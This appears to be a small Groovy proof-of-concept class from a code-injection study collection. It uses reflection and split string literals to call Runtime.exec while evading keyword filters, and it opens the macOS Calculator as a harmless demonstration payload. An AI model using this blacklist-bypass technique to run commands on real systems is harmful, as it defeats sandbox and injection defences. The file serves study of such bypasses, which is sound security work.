package com.t4rrega.injection.Code.Groovy

import java.lang.reflect.Method

class ExecBypass {
    static void main(String[] args) {

        Class<?> rt = Class.forName("java.la" + "ng.Run" + "time");
        Method gr = rt.getMethod("getR" + "untime");
        Method ex = rt.getMethod("ex" + "ec", String.class);
        ex.invoke(gr.invoke(null), "open -a" + "Calculator.app")
    }
}
